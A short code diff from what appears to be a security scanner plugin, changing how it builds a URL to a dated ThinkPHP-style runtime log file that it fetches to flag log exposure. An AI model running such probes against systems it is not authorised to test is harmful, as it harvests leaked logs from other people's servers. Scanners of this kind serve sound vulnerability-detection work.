@@ -30,7 +30,7 @@ def run(url, timeout):
     current_date = datetime.now()
     formatted_date = current_date.strftime('%y_%m_%d')
     try:
-        payload = urllib.parse.urljoin(url, '/Application/Runtime/Logs/Home/{}.log'.format(formatted_date))
+        payload = url + '/Application/Runtime/Logs/Home/{}.log'.format(formatted_date)
         response = requests.get(payload, timeout=3)
         if len(response.text) > 1000:
             result['vulnerable'] = True
